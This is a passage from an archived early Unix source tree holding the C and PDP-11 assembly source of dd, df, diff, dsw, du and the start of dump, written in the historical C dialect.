	0334,0335,0336,0337,0352,0353,0354,0355,
	0356,0357,0372,0373,0374,0375,0376,0377,
};


main(argc, argv)
int	argc;
char	**argv;
{
	register (*conv)();
	register char *ip;
	register c;
	int ebcdic(), ascii(), null(), cnull(), term();
	int a;

	conv = null;
	for(c=1; c<argc; c++) {
		string = argv[c];
		if(match("ibs=")) {
			ibs = number();
			continue;
		}
		if(match("obs=")) {
			obs = number();
			continue;
		}
		if(match("cbs=")) {
			cbs = number();
			continue;
		}
		if (match("bs=")) {
			bs = number();
			continue;
		}
		if(match("if=")) {
			ifile = string;
			continue;
		}
		if(match("of=")) {
			ofile = string;
			continue;
		}
		if(match("skip=")) {
			skip = number();
			continue;
		}
		if(match("count=")) {
			count = number();
			continue;
		}
		if(match("conv=")) {
		cloop:
			if(match(","))
				goto cloop;
			if(*string == '\0')
				continue;
			if(match("ebcdic")) {
				conv = ebcdic;
				goto cloop;
			}
			if(match("ascii")) {
				conv = ascii;
				goto cloop;
			}
			if(match("lcase")) {
				cflag =| LCASE;
				goto cloop;
			}
			if(match("ucase")) {
				cflag =| UCASE;
				goto cloop;
			}
			if(match("swab")) {
				cflag =| SWAB;
				goto cloop;
			}
			if(match("noerror")) {
				cflag =| NERR;
				goto cloop;
			}
			if(match("sync")) {
				cflag =| SYNC;
				goto cloop;
			}
		}
		printf("bad arg: %s\n", string);
		exit();
	}
	if(conv == null && cflag&(LCASE|UCASE))
		conv = cnull;
	if (ifile)
		ibf = open(ifile, 0);
	else
		ibf = dup(0);
	if(ibf < 0) {
		printf("cannot open: %s\n", ifile);
		exit();
	}
	if (ofile)
		obf = creat(ofile, 0666);
	else
		obf = dup(1);
	if(obf < 0) {
		printf("cannot create: %s\n", ofile);
		exit();
	}
	if (bs) {
		ibs = obs = bs;
		if (conv == null)
			fflag++;
	}
	if(ibs == 0 || obs == 0) {
		printf("counts: cannot be zero\n");
		exit();
	}
	ibuf = sbrk(ibs);
	if (fflag)
		obuf = ibuf;
	else
		obuf = sbrk(obs);
	if(ibuf == -1 || obuf == -1) {
		printf("not enough memory\n");
		exit();
	}
	ibc = 0;
	obc = 0;
	cbc = 0;
	op = obuf;

	if ((signal(2, 1) & 01) == 0)
		signal(2, term);
	while(skip) {
		read(ibf, ibuf, ibs);
		skip--;
	}

loop:
	if(ibc-- == 0) {
		ibc = 0;
		if(count==0 || nifr+nipr!=count) {
			if(cflag&(NERR|SYNC))
			for(ip=ibuf+ibs; ip>ibuf;)
				*--ip = 0;
			ibc = read(ibf, ibuf, ibs);
		}
		if(ibc == -1) {
			perror("read");
			if((cflag&NERR) == 0) {
				flsh();
				term();
			}
			ibc = 0;
			for(c=0; c<ibs; c++)
				if(ibuf[c] != 0)
					ibc = c;
			stats();
		}
		if(ibc == 0) {
			flsh();
			term();
		}
		if(ibc != ibs) {
			nipr++;
			if(cflag&SYNC)
				ibc = ibs;
		} else
			nifr++;
		ip = ibuf;
		c = (ibc>>1) & ~1;
		if(cflag&SWAB && c)
		do {
			a = *ip++;
			ip[-1] = *ip;
			*ip++ = a;
		} while(--c);
		ip = ibuf;
		if (fflag) {
			obc = ibc;
			flsh();
			ibc = 0;
		}
		goto loop;
	}
	c = 0;
	c =| *ip++;
	(*conv)(c);
	goto loop;
}

flsh()
{
	register c;

	if(obc) {
		if(obc == obs)
			nofr++; else
			nopr++;
		c = write(obf, obuf, obc);
		if(c != obc) {
			perror("write");
			term();
		}
		obc = 0;
	}
}

match(s)
char *s;
{
	register char *cs;

	cs = string;
	while(*cs++ == *s)
		if(*s++ == '\0')
			goto true;
	if(*s != '\0')
		return(0);

true:
	cs--;
	string = cs;
	return(1);
}

number()
{
	register char *cs;
	register n;

	cs = string;
	n = 0;
	while(*cs >= '0' && *cs <= '9')
		n = n*10 + *cs++ - '0';
	for(;;)
	switch(*cs++) {

	case 'k':
		n =* 1024;
		continue;

	case 'w':
		n =* 2;
		continue;

	case 'b':
		n =* 512;
		continue;

	case '*':
	case 'x':
		string = cs;
		n =* number();

	case '\0':
		return(n);
	}
	printf("not a number: %s\n", string);
	exit();
}

cnull(cc)
{
	register c;

	c = cc;
	if(cflag&UCASE && c>='a' && c<='z')
		c =+ 'A'-'a';
	if(cflag&LCASE && c>='A' && c<='Z')
		c =+ 'a'-'A';
	null(c);
}

null(c)
{

	*op = c;
	op++;
	if(++obc >= obs) {
		flsh();
		op = obuf;
	}
}

ascii(cc)
{
	register c;

	c = 0;
	c =| etoa[cc];
	if(cbs == 0) {
		cnull(c);
		return;
	}
	if(c == ' ') {
		nspace++;
		goto out;
	}
	while(nspace > 0) {
		null(' ');
		nspace--;
	}
	cnull(c);

out:
	if(++cbc >= cbs) {
		null('\n');
		cbc = 0;
		nspace = 0;
	}
}

ebcdic(cc)
{
	register c;

	c = cc;
	if(cflag&UCASE && c>='a' && c<='z')
		c =+ 'A'-'a';
	if(cflag&LCASE && c>='A' && c<='Z')
		c =+ 'a'-'A';
	c = atoe[c] & 0377;
	if(cbs == 0) {
		null(c);
		return;
	}
	if(cc == '\n') {
		while(cbc < cbs) {
			null(atoe[' ']);
			cbc++;
		}
		cbc = 0;
		return;
	}
	if(cbc == cbs)
		ntrunc++;
	cbc++;
	if(cbc <= cbs)
		null(c);
}

term()
{

	stats();
	exit();
}

stats()
{

	printf("%l+%l records in\n", nifr, nipr);
	printf("%l+%l records out\n", nofr, nopr);
	if(ntrunc)
		printf("%l truncated records\n", ntrunc);
}

putchar(c)
{

	write(2, &c, 1);
}
-- /usr/source/s1/df.c mode=0100664 uid=3 gid=3 atime=174922794 mtime=169260571 --
char	*dargv[]
{
	0,
	"/dev/rk2",
	"/dev/rp0",
	0
};
struct
{
	char	*s_isize;
	char	*s_fsize;
	int	s_nfree;
	int	s_free[100];
	int	s_ninode;
	int	s_inode[100];
	char	s_flock;
	char	s_ilock;
	char	s_fmod;
	int	time[2];
	int	pad[50];
} sblock;

int	fi;

main(argc, argv)
char **argv;
{
	int i;

	if(argc <= 1) {
		for(argc = 1; dargv[argc]; argc++);
		argv = dargv;
	}

	for(i=1; i<argc; i++) {
		if(argc > 1)
			printf("%s ", argv[i]);
		dfree(argv[i]);
	}
}

dfree(file)
char *file;
{
	int i;

	fi = open(file, 0);
	if(fi < 0) {
		printf("cannot open %s\n", file);
		return;
	}
	sync();
	bread(1, &sblock);
	i = 0;
	while(alloc())
		i++;
	printf("%l\n", i);
	close(fi);
}

alloc()
{
	int b, i, buf[256];

	i = --sblock.s_nfree;
	if(i<0 || i>=100) {
		printf("bad free count\n");
		return(0);
	}
	b = sblock.s_free[i];
	if(b == 0)
		return(0);
	if(b<sblock.s_isize+2 || b>=sblock.s_fsize) {
		printf("bad free block (%l)\n", b);
		return(0);
	}
	if(sblock.s_nfree <= 0) {
		bread(b, buf);
		sblock.s_nfree = buf[0];
		for(i=0; i<100; i++)
			sblock.s_free[i] = buf[i+1];
	}
	return(b);
}

bread(bno, buf)
{
	int n;
	extern errno;

	seek(fi, bno, 3);
	if((n=read(fi, buf, 512)) != 512) {
		printf("read error %d\n", bno);
		printf("count = %d; errno = %d\n", n, errno);
		exit();
	}
}
-- /usr/source/s1/diff1.c mode=0110664 uid=3 gid=3 atime=174922808 mtime=169260571 --
/*	diff - differential file comparison
*
*	Uses an algorithm due to Harold Stone, which finds
*	a pair of longest identical subsequences in the two
*	files.
*
*	The major goal is to generate the match vector J.
*	J[i] is the index of the line in file1 corresponding
*	to line i file0. J[i] = 0 if there is no
*	such line in file1.
*
*	Lines are hashed so as to work in core. All potential
*	matches are located by sorting the lines of each file
*	on the hash (called value_____). In particular, this
*	collects the equivalence classes in file1 together.
*	Subroutine equiv____  replaces the value of each line in
*	file0 by the index of the first element of its 
*	matching equivalence in (the reordered) file1.
*	To save space equiv_____ squeezes file1 into a single
*	array member______ in which the equivalence classes
*	are simply concatenated, except that their first
*	members are flagged by changing sign.
*
*	Next the indices that point into member______ are unsorted_______   into
*	array class_____ according to the original order of file0.
*
*	The cleverness lies in routine stone______. This marches
*	through the lines of file0, developing a vector klist_____
*	of "k-candidates". At step i a k-candidate is a matched
*	pair of lines x,y (x in file0 y in file1) such that
*	there is a common subsequence of lenght k
*	between the first i lines of file0 and the first y 
*	lines of file1, but there is no such subsequence for
*	any smaller y. x is the earliest possible mate to y
*	that occurs in such a subsequence.
*
*	Whenever any of the members of the equivalence class of
*	lines in file1 matable to a line in file0 has serial number 
*	less than the y of some k-candidate, that k-candidate 
*	with the smallest such y is replaced. The new 
*	k-candidate is chained (via pred____) to the current
*	k-1 candidate so that the actual subsequence can
*	be recovered. When a member has serial number greater
*	that the y of all k-candidates, the klist is extended.
*	At the end, the longest subsequence is pulled out
*	and placed in the array J by unravel_______.
*
*	With J in hand, the matches there recorded are
*	check_____ed against reality to assure that no spurious
*	matches have crept in due to hashing. If they have,
*	they are broken, and "jackpot " is recorded--a harmless
*	matter except that a true match for a spuriously
*	mated line may now be unnecessarily reported as a change.
*
*	Much of the complexity of the program comes simply
*	from trying to minimize core utilization and
*	maximize the range of doable problems by dynamically
*	allocating what is needed and reusing what is not.
*	The core requirements for problems larger than somewhat
*	are (in words) 2*length(file0) + length(file1) +
*	3*(number of k-candidates installed),  typically about
*	6n words for files of length n. There is also space for buf1
*	used which could, by moving data underfoot and reallocating
*	buf1 together with buf2, be completely overlaid.
*/
struct buf {
	int fdes;
	char data[516];
} *buf1, *buf2;

struct cand {
	int x;
	int y;
	struct cand *pred;
} cand;
struct line {
	int serial;
	int value;
} *file[2], line;
int len[2];
int *class;	/*will be overlaid on file[0]*/
int *member;	/*will be overlaid on file[1]*/
struct cand **klist;	/*will be overlaid on file[0] after class*/
int *J;		/*will be overlaid on class*/
int *ixold;	/*will be overlaid on klist*/
int *ixnew;	/*will be overlaid on file[1]*/

char *area;
char *top;
alloc(n)
{
	register char *p;
	p = area;
	n = (n+1) & ~1;
	area =+ n;
	while(area > top) {
		if(sbrk(1024) == -1) {
			mesg("Out of space\n");
			exit(1);
		}
		top =+ 1024;
	}
	return(p);
}

mesg(s)
char *s;
{
	while(*s)
		write(2,s++,1);
}

sort(a,n)	/*shellsort CACM #201*/
struct line *a;
{
	struct line w;
	register int j,m;
	struct line *ai;
	register struct line *aim;
	int k;
	for(j=1;j<=n;j=* 2)
		m = 2*j - 1;
	for(m=/2;m!=0;m=/2) {
		k = n-m;
		for(j=1;j<=k;j++) {
			for(ai = &a[j]; ai > a; ai =- m) {
				aim = &ai[m];
				if(aim->value > ai[0].value ||
				   aim->value == ai[0].value &&
				   aim->serial > ai[0].serial)
					break;
				w.value = ai[0].value;
				ai[0].value = aim->value;
				aim->value = w.value;
				w.serial = ai[0].serial;
				ai[0].serial = aim->serial;
				aim->serial = w.serial;
			}
		}
	}
}

unsort(f, l, b)
struct line *f;
int *b;
{
	int *a;
	int i;
	a = alloc((l+1)*sizeof(a[0]));
	for(i=1;i<=l;i++)
		a[f[i].serial] = f[i].value;
	for(i=1;i<=l;i++)
		b[i] = a[i];
	area = a;
}

prepare(i, arg)
char *arg;
{
	register char *temp;
	temp = file[i] = area;
	alloc(sizeof(line));
	input(arg);
	len[i] = (area - temp)/sizeof(line) - 1;
	alloc(sizeof(line));
	sort(file[i], len[i]);
}

input(arg)
{
	register int h, i;
	register struct line *p;
	if(fopen(arg,buf1) == -1) {
		mesg("Cannot open ");
		mesg(arg);
		mesg("\n");
		exit(1);
	}
	for(i=0; h=readhash(buf1);) {
		p = alloc(sizeof(line));
		p->serial = ++i;
		p->value = h;
	}
	close(buf1->fdes);
}

equiv(a,n,b,m,c)
struct line *a, *b;
int *c;
{
	register int i, j;
	i = j = 1;
	while(i<=n && j<=m) {
		if(a[i].value <b[j].value)
			a[i++].value = 0;
		else if(a[i].value == b[j].value)
			a[i++].value = j;
		else
			j++;
	}
	while(i <= n)
		a[i++].value = 0;
	b[m+1].value = 0;
	j = 0;
	while(++j <= m) {
		c[j] = -b[j].serial;
		while(b[j+1].value == b[j].value) {
			j++;
			c[j] = b[j].serial;
		}
	}
	c[j] = -1;
}

main(argc, argv)
char **argv;
{
	int k;

	if(argc>1 && *argv[1]=='-') {
		argc--;
		argv++;
	}
	if(argc!=3) {
		mesg("Arg count\n");
		exit(1);
	}

	area = top = sbrk(0);
	buf1 = alloc(sizeof(*buf1));
	prepare(0, argv[1]);
	prepare(1, argv[2]);

	member = file[1];
	equiv(file[0], len[0], file[1], len[1], member);

	class = file[0];
	unsort(file[0], len[0], class);

	klist = &class[len[0]+2];
	area = &member[len[1]+2];
	k = stone(class, len[0], member, klist);
	J = class;
	unravel(klist[k]);

	ixold = klist;
	ixnew = file[1];
	area = &ixnew[len[1]+2];
	buf2 = alloc(sizeof(*buf2));
	if(check(argv))
		mesg("Jackpot\n");
	output(argv);
}

stone(a,n,b,c)
int *a;
int *b;
struct cand **c;
{
	register int i, k,y;
	int j, l;
	int skip;
	k = 0;
	c[0] = 0;
	for(i=1; i<=n; i++) {
		j = a[i];
		if(j==0)
			continue;
		skip = 0;
		do {
			y = b[j];
			if(y<0) y = -y;
			if(skip)
				continue;
			l = search(c, k, y);
			if(l > k) {
				c[k+1] = newcand(i,y,c[k]);
				skip = 1;
				k++;
			}
			else if(c[l]->y > y && c[l]->x < i)
				c[l] = newcand(i,y,c[l-1]);
		} while(b[++j] > 0);
	}
	return(k);
}

struct cand *
newcand(x,y,pred)
struct cand *pred;
{
	struct cand *p;
	p = alloc(sizeof(cand));
	p->x = x;
	p->y = y;
	p->pred = pred;
	return(p);
}

search(c, k, y)
struct cand **c;
{
	register int i, j, l;
	int t;
	i = 0;
	j = k+1;
	while((l=(i+j)/2) > i) {
		t = c[l]->y;
		if(t > y)
			j = l;
		else if(t < y)
			i = l;
		else
			return(l);
	}
	return(l+1);
}

unravel(p)
struct cand *p;
{
	int i;
	for(i=0; i<=len[0]; i++)
		J[i] = 0;
	while(p) {
		J[p->x] = p->y;
		p = p->pred;
	}
}

/* check does double duty:
1.  ferret out any fortuitous correspondences due
to counfounding by hashing (which result in "jackpot")
2.  collect random access indexes to the two files */

check(argv)
char **argv;
{
	register int i, j;
	int ctold, ctnew;
	int jackpot;
	char c,d;
	fopen(argv[1],buf1);
	fopen(argv[2],buf2);
	j = 1;
	ctold = ctnew = 0;
	ixold[0] = ixnew[0] = 0;
	jackpot = 0;
	for(i=1;i<=len[0];i++) {
		if(J[i]==0) {
			while(getc(buf1)!='\n') ctold++;
			ixold[i] = ++ctold;
			continue;
		}
		while(j<J[i]) {
			while(getc(buf2)!='\n') ctnew++;
			ixnew[j] = ++ctnew;
			j++;
		}
		while((c=getc(buf1))==(d=getc(buf2))) {
			if(c=='\n') break;
			ctold++;
			ctnew++;
		}
		while(c!='\n') {
			jackpot++;
			J[i] = 0;
			c = getc(buf1);
			ctold++;
		}
		ixold[i] = ++ctold;
		while(d!='\n') {
			jackpot++;
			J[i] = 0;
			d = getc(buf2);
			ctnew++;
		}
		ixnew[j] = ++ctnew;
		j++;
	}
	for(;j<=len[1];j++) {
		while(getc(buf2)!='\n') ctnew++;
		ixnew[j] = ++ctnew;
	}
	close(buf1->fdes);
	close(buf2->fdes);
	return(jackpot);
}

output(argv)
char **argv;
{
	int dir;
	int m;
	int i0,i1,j0,j1;
	extern fout;
	dir = **argv=='-';
	fout = dup(1);
	buf1->fdes = open(argv[1],0);
	buf2->fdes = open(argv[2],0);
	m = len[0];
	J[0] = 0;
	J[m+1] = len[1]+1;
	if(dir==0) for(i0=1;i0<=m;i0=i1+1) {
		while(i0<=m&&J[i0]==J[i0-1]+1) i0++;
		j0 = J[i0-1]+1;
		i1 = i0-1;
		while(i1<m&&J[i1+1]==0) i1++;
		j1 = J[i1+1]-1;
		J[i1] = j1;
		change(i0,i1,j0,j1,dir);
	} else for(i0=m;i0>=1;i0=i1-1) {
		while(i0>=1&&J[i0]==J[i0+1]-1&&J[i0]!=0) i0--;
		j0 = J[i0+1]-1;
		i1 = i0+1;
		while(i1>1&&J[i1-1]==0) i1--;
		j1 = J[i1-1]+1;
		J[i1] = j1;
		change(i1,i0,j1,j0,dir);
	}
	if(m==0)
		change(1,0,1,len[1],dir);
	flush();
}

change(a,b,c,d,dir)
{
	if(a>b&&c>d) return;
	range(a,b);
	putchar(a>b?'a':c>d?'d':'c');
	if(dir==0) range(c,d);
	putchar('\n');
	if(dir==0) {
		fetch(ixold,a,b,buf1,"* ");
		if(a<=b&&c<=d) printf("---\n");
	}
	fetch(ixnew,c,d,buf2,dir==0?". ":"");
	if(dir!=0&&c<=d) printf(".\n");
}

range(a,b)
{
	if(a>b) printf("%d",b);
	if(a<=b) printf("%d",a);
	if(a<b) printf(",%d",b);
}

fetch(f,a,b,lb,pref)
int *f;
struct buf *lb;
char *pref;
{
	int i, j;
	int nc;
	for(i=a;i<=b;i++) {
		seek(lb->fdes,f[i-1],0);
		nc = read(lb->fdes,lb->data,f[i]-f[i-1]);
		printf(pref);
		for(j=0;j<nc;j++)
			putchar(lb->data[j]);
	}
}

-- /usr/source/s1/diff2.s mode=0100664 uid=3 gid=3 atime=174922823 mtime=169260571 --
/	hash routine for diff
/	effectively spreads the string out into 7-bit
/	bytes, then sums the result 1's-complement
/	by 16-bit bytes and adds 1 to avoid zero answer

/	r4 hash accumulator
/	r3 current offset
/	r2 first time flag
.globl	_readhash
.globl getc

.data
_readhash:
	mov	2(sp),0f
	mov	r5,-(sp)
	mov	r4,-(sp)
	mov	r3,-(sp)
	mov	r2,-(sp)
	mov	$1,r4
	mov	r4,r2
	clr	r3
1:
	jsr	r5,getc; 0: 0
	bes	2f
	clr	r2
	cmp	r0,$'\n
	beq	1f
	ashc	$-16.,r0
	ashc	r3,r0
	add	r0,r4
	adc	r4
	add	r1,r4
	adc	r4
	add	$7,r3
	cmp	r3,$16.
	blt	1b
	sub	$16.,r3
	br	1b
2:
	tst	r2
	bne	2f
	mov	$2,r0
	sys	write; 3f; 4f-3f
2:
	clr	r4
1:
	mov	r4,r0
	mov	(sp)+,r2
	mov	(sp)+,r3
	mov	(sp)+,r4
	mov	(sp)+,r5
	rts	pc
3:
	<incomplete line omitted\n>
4:
.even
-- /usr/source/s1/dsw.s mode=0100664 uid=3 gid=3 atime=174922832 mtime=169260571 --
/ dsw - delete from tty

	cmp	(sp)+,$2
	blt	1f
	tst	(sp)+
	mov	(sp)+,0f
1:
	sys	stat; 0:dot; stbuf
	bes	error
	mov	stbuf+4,r0
	bic	$!60000,r0
	cmp	r0,$40000
	bne	error
	mov	0b,0f
	sys	open; 0:..; 0
	bes	error
	mov	r0,r1
1:
	clrb	buf+17.
	mov	r1,r0
	sys	read; buf; 16.
	bes	done
	tst	r0
	beq	done
	tst	buf
	beq	1b
	mov	0b,r2
	mov	$obuf,r3
2:
	movb	(r2)+,(r3)+
	bne	2b
	mov	$buf+2,r2
	dec	r3
	cmpb	-1(r3),$'/
	beq	2f
	movb	$'/,(r3)+
2:
	movb	(r2)+,(r3)+
	bne	2b
	sys	stat; obuf; stbuf
	bes	error
	bit	$60000,stbuf+4
	bne	1b
	mov	$buf+2,r2
2:
	tstb	(r2)+
	bne	2b
	movb	$' ,-(r2)
	sub	$buf+1,r2
	mov	r2,0f

2:
	mov	$1,r0
	sys	write; buf+2; 0:..
	clr	r0
	sys	read; ch; 1
	cmpb	ch,$'\n
	beq	1b
	clr	r0
	sys	read; ch1; 1
	cmpb	ch1,$'\n
	beq	3f
4:
	clr	r0
	sys	read; ch; 1
	cmpb	ch,$'\n
	beq	2b
	br	4b
3:
	cmpb	ch,$'x
	beq	done
	cmpb	ch,$'y
	bne	2b
	sys	unlink; obuf
	bes	error
	br	1b

done:
	sys	exit

error:
	mov	$1,r0
	sys	write; mes; 2
	sys	exit

dot:	<.\0>
mes:	<?\n>

	.bss
obuf:	.=.+100.
stbuf:	.=.+40.
buf:	.=.+18.
ch:	.=.+1
ch1:	.=.+1

-- /usr/source/s1/du.s mode=0100664 uid=3 gid=3 atime=174922835 mtime=169260571 --
/ dusg -- summarize disk usage

.globl	putc, flush, _end
	mov	$1,obuf
	mov	(sp)+,r5
	tst	(sp)+
1:
	dec	r5
	bgt	2f
	tstb	buf1
	beq	3f
	jsr	r5,flush; obuf
	sys	exit
3:
	mov	$dot,r0
	br	3f
2:
	mov	(sp)+,r0
3:
	cmpb	(r0),$'-
	bne	2f
	cmpb	1(r0),$'a
	bne	3f
	inc	aflg
	br	1b
3:
	cmpb	1(r0),$'s
	bne	1b
	dec	aflg
	br	1b
2:
	mov	$buf1,r1
2:
	movb	(r0)+,(r1)+
	bne	2b
	dec	r1
	clr	buf3+10.
	mov	$_end,iptr
	mov	$_end,brk
	sys	break; _end
	jsr	pc,tree
	tst	aflg
	bpl	1b
	jsr	r5,name
	br	1b

tree:
	sys	stat; buf1; buf2
	bes	1f
	bic	$!60000,buf2+4
	bit	$20000,buf2+4
	beq	2f
1:
	clr	r4
	rts	pc
2:
	mov	$_end,r2
	mov	buf2+2,r3
1:
	cmp	r2,iptr
	bhis	1f
	cmp	r3,(r2)+
	bne	1b
	clr	r4
	jsr	r5,cname
	rts	pc
1:
	cmp	r2,brk
	blo	1f
	add	$512.,brk
	sys	break; brk: ..
1:
	mov	r3,(r2)+
	mov	r2,iptr
	cmp	$40000,buf2+4
	beq	1f
	jsr	pc,gsize
	jsr	r5,cname
	rts	pc
1:
	jsr	pc,gsize
	mov	r4,r3
	sys	open; buf1; 0
	bec	1f
	rts	pc
1:
	mov	r0,-(sp)
	mov	r1,-(sp)
1:
	mov	2(sp),r0
	sys	read; buf3; 16.
	bes	1f
	tst	r0
	beq	1f
	tst	buf3
	beq	1b
	cmp	buf3+2,$".\0
	beq	1b
	cmp	buf3+2,$"..
	bne	2f
	tst	buf3+4
	beq	1b
2:
	mov	$buf3+2,r2
	mov	(sp),r1
	movb	$'/,(r1)+
	cmpb	-2(r1),$'/
	bne	2f
	dec	r1
2:
	movb	(r2)+,(r1)+
	bne	2b
	dec	r1
	mov	r3,-(sp)
	jsr	pc,tree
	mov	r4,r3
	add	(sp)+,r3
	br	1b
1:
	mov	(sp)+,r1
	clrb	(r1)
	mov	(sp)+,r0
	sys	close
	mov	r3,r4
	tst	aflg
	bmi	1f
	jsr	r5,name
1:
	rts	pc

cname:
	tst	aflg
	bgt	name
	rts	r5

name:
	jsr	pc,pnum
	mov	$011,r0
	jsr	pc,pchar
	mov	$buf1,r2
1:
	movb	(r2)+,r0
	beq	1f
	jsr	pc,pchar
	br	1b
1:
	mov	$'\n,r0
	jsr	pc,pchar
	rts	r5

gsize:
	mov	r5,-(sp)
	mov	buf2+10.,r5		/ size
	movb	buf2+9.,r4
	add	$511.,r5
	adc	r4
	alsc	$-9,r4
	cmp	r5,$8.
	blo	1f
	mov	r5,-(sp)
	add	$255.,r5
	alsc	$-8,r4
	add	(sp)+,r5
1:
	mov	r5,r4
	mov	(sp)+,r5
	rts	pc

pnum:
	mov	r4,-(sp)
	mov	r5,-(sp)
	mov	r4,r5
	jsr	pc,1f
	mov	(sp)+,r5
	mov	(sp)+,r4
	rts	pc
1:
	clr	r4
	dvd	$10.,r4
	mov	r5,-(sp)
	mov	r4,r5
	beq	1f
	jsr	pc,1b
1:
	mov	(sp)+,r0
	add	$'0,r0
	jsr	pc,pchar
	rts	pc

pchar:
	jsr	r5,putc; obuf
	rts	pc

dot:	<.\0>

	.bss

iptr:	.=.+2
buf1:	.=.+100.
buf2:	.=.+40.
buf3:	.=.+18.
aflg:	.=.+2
obuf:	.=.+520.
-- /usr/source/s1/dump.c mode=0110664 uid=3 gid=3 atime=174922842 mtime=169260571 --
#

/*
 * incremental dump
 * dump fisbuodh filesystem
 * f take output tape from arglist
 * i from date in /etc/dtab
 * s specify tape size in feet (feet = blocks/9)
 * b specify tape size in blocks
 * u update /etc/dtab to current date
 * 0 dump from the epoch
 * d dump specified number of days
 * h dump specified number of hours
 * a on incremental dump, dump files even >= MAXSIZE
 */

char	*dargv[]
{
	0,
	"i",
	"/dev/rp0",
	0
};

#include "/usr/sys/ino.h"
#include "/usr/sys/filsys.h"
#define	MAXSIZE	1000
struct filsys sblock;
struct
{
	char	name[16];
	int	date[2];
} dtab[10];
char	*dfile	"/etc/dtab";
char	*ofile;
int	*talist;
int	fi;
int	buf[256];
int	dbuf[256];
int	ibuf[256];
int	vbuf[256];
char	*date[2];
char	*ddate[2];
int	fo	-1;
int	pher;
int	dflg;
int	iflg;
int	cflg;
int	aflg;
char	*tsize	19000;
char	*taddr;

main(argc, argv)
char **argv;
{
	char *key;
	int s, i, nfil, nblk, f;
	register *tap;
	register struct inode *ip;
	int ino;

	ofile = "/dev/mt0";
	time(date);
	if(argc == 1) {
		argv = dargv;
		for(argc = 1; dargv[argc]; argc++);
	}

	argc--;
	argv++;
	key = *argv;
	while(*key)
	switch(*key++) {

	default:
		printf("bad character in key\n");
		exit();

	case 'a': /* dump all (even large) */
		aflg++;
		continue;

	case '-':
		continue;

	case 'c': /* increment file name */
		cflg++;
		continue;

	case 'f': /* file name from arg list */
		argc--;
		argv++;
		ofile = *argv;
		continue;

	case 'i': /* date from date file */
		iflg++;
		continue;

	case 's': /* tape size */
		tsize = number(argv[1]) * 9;
		argv++;
		argc--;
		continue;

	case 'b': /* tape size */
		tsize = number(argv[1]);
		argv++;
		argc--;
		continue;

	case 'u': /* rewrite date */
		dflg++;
		continue;

	case '0': /* dump all */
		ddate[0] = ddate[1] = 0;
		continue;

	case 'd': /* dump some number of days */
		i = 21600;
		goto sd;

	case 'h': /* dump some number of hours */
		i = 900;
		goto sd;

	sd:
		ddate[0] = date[0];
		ddate[1] = date[1];
		s = number(argv[1])*4;
		argv++;
		argc--;
		while(s) {
			if(i > ddate[1])
				ddate[0]--;
			ddate[1] =- i;
			s--;
		}
		continue;
	}
	if(argc <= 1) {
		printf("no file system specified\n");
		exit();
	}
	if(iflg) {
		f = open(dfile, 0);
		if(f >= 0) {
			read(f, dtab, sizeof dtab);
			close(f);
			for(i=0; i<10; i++)
				if(equal(dtab[i].name, argv[1])) {
					ddate[0] = dtab[i].date[0];
					ddate[1] = dtab[i].date[1];
				}
		}
	}
	printf("%s:\n", argv[1]);
	fi = open(argv[1], 0);
	if(fi < 0) {
		printf("cannot open %s\n", argv[1]);
		exit();
	}
	printf("incremental dump from\n");
	pdate(ddate);
	sync();
	bread(1, &sblock);
	talist = sbrk(size(0, sblock.s_isize*32)*512);
	tap = talist;
	if(tap == -1) {
		printf("No memory\n");
		exit();
	}
	nfil = 0;
	nblk = size(0, sblock.s_isize*32);
	ino = 0;
	for(i=0; i<sblock.s_isize; i++) {
		bread(i+2, buf);
		for(ip = &buf[0]; ip < &buf[256]; ip++) {
			ino++;
			if(ip->i_mode == 0 || ip->i_nlink == 0) {
				*tap++ = -1;
				continue;
			}
			if(ip->i_mtime[0] < ddate[0])
				goto no;
			if(ip->i_mtime[0] == ddate[0] &&
			   ip->i_mtime[1] <  ddate[1])
				goto no;
			s = size(ip->i_size0&0377, ip->i_size1) + 1;
			if (s>MAXSIZE && aflg==0 && iflg!=0) {
				printf("%l big; not dumped.\n", ino);
				goto no;
			}
			nfil++;
			nblk =+ s;
			*tap++ = s;
			continue;
		no:
			*tap++ = 0;
		}
	}
	printf("%l files\n%l blocks\n", nfil, nblk);
	i = ldiv(0, nblk, ldiv(0, tsize, 10));
	printf("%l.%l tapes\n", i/10, i%10);
	tap = buf;
	clrbuf(tap);
	*tap++ = sblock.s_isize;
	*tap++ = sblock.s_fsize;
	*tap++ = date[0];
	*tap++ = date[1];
	*tap++ = ddate[0];
	*tap++ = ddate[1];
	*tap++ = tsize;
	swrite(buf);
	i = size(0, sblock.s_isize*32);
	tap = talist;
	while(i--) {
		bwrite(tap);
		tap =+ 256;
	}
	tap = talist;
	for(i=0; i<sblock.s_isize; i++) {
		bread(i+2, buf);
		for(ip = &buf[0]; ip < &buf[256]; ip++) {
			if(*tap && *tap != -1)
				dump(ip, *tap-1);
			tap++;
		}
	}
	printf("%l phase errors\n", pher);
	if(!dflg)
		exit();
	for(i=0; i<10; i++)
		dtab[i].name[0] = 0;
	f = open(dfile, 2);
	if(f < 0) {
		f = creat(dfile, 0666);
		if(f < 0) {
			printf("cannot create %s\n", dfile);
			exit();
		}
	} else
		read(f, dtab, sizeof dtab);
	for(i=0; i<10; i++)
		if(dtab[i].name[0] == 0 || equal(dtab[i].name, argv[1]))
			goto found;
	printf("%s full\n", dfile);
	exit();

found:
	for(s=0; s<15; s++) {
		dtab[i].name[s] = argv[1][s];
		if(argv[1][s] == 0)
			break;
	}
	dtab[i].date[0] = date[0];
	dtab[i].date[1] = date[1];
	seek(f, 0, 0);
	write(f, dtab, sizeof dtab);
	printf("date updated\n");
	pdate(date);
}

pdate(d)
int *d;
{

	if(d[0] == 0 && d[1] == 0)
		printf("the epoch\n"); else
		printf(ctime(d));
}

dump(ip, sz)
struct inode *ip;
{
	register *p, *q, *r;

	p = dbuf;
	q = ip;
	clrbuf(p);
	while(q < &ip->i_mtime[2])
		*p++ = *q++;
	swrite(dbuf);
	if(ip->i_mode & (IFBLK&IFCHR)) {
		if(sz != 0)
			printf("special\n");
		return;
	}
	for(p = &ip->i_addr[0]; p < &ip->i_addr[8]; p++)
	if(*p) {
		if(ip->i_mode&ILARG) {
			bread(*p, ibuf);
			for(q = &ibuf[0]; q < &ibuf[256]; q++)
			if(*q) {
				if(p == &ip->i_addr[7]) {
					bread(*q, vbuf);
					for(r = &vbuf[0]; r < &vbuf[256]; r++)
					if(*r) {
						if(--sz < 0)
							goto pe;
						bread(*r, dbuf);
						bwrite(dbuf);
					}
					continue;
				}
				if(--sz < 0)
					goto pe;
				bread(*q, dbuf);
				bwrite(dbuf);
			}
		} else {
			if(--sz < 0)
				goto pe;
			bread(*p, dbuf);
